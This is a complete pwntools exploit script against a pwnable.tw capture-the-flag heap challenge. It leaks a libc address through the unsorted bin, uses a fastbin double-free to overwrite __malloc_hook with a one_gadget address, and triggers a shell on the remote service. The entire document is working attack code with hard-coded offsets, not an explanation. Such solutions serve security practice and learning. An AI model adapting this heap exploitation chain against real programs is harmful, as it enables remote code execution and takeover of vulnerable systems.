###unsorted bin leak + fast bin dup

from pwn import *

###Utils
def create(size,name,color):
    r.sendlineafter('choice : ','1')
    r.sendlineafter('name :',str(size))
    r.sendafter('flower :',name)
    r.sendlineafter('flower :',color)

def show():
    r.sendlineafter('choice : ','2')
    res = r.recvuntil('☆')[:-1]
    return res

def delete(idx):
    r.sendlineafter('choice : ','3')
    r.sendlineafter('garden:',str(idx))

###Useful_addr
main_arena_offset = 0x3c3b20
unsorted_bin_offset = main_arena_offset+0x58
malloc_hook_offset =  0x3c3b10
malloc_hook_writer_offset =  malloc_hook_offset - 0x23
one_gadget_offset = 0xef6c4


###Exploit
r = remote('chall.pwnable.tw',10203)

###Unsorted bin onto heap to get libc
#  Creates a meta block of 0x30, thus splits the original 0xa8 chunk
create(0xa8,'a','a')   #0
create(0xa8,'b','b')    #1
delete(0)
create(0x78,'cccccccc','c') #2
unsorted_bin_addr = u64(show().split(b'cccccccc')[1][:6].ljust(8,b'\x00'))
libc_base = unsorted_bin_addr -unsorted_bin_offset
print(hex(libc_base))

###Fastbin attack to overwrite malloc_hook
create(0x68,'d','d')    #3
create(0x68,'e','e')    #4
delete(3)
delete(4)
delete(3)
create(0x68,p64(malloc_hook_writer_offset+libc_base)+b'ffffffff','f')    #5
create(0x68,'g','g')    #6
create(0x68,'h','h')    #7
create(0x68,b'\x00'*3+p64(0)*2+p64(one_gadget_offset+libc_base),'i')    #8

###Double free get shell
delete(0)
delete(0)
r.interactive()
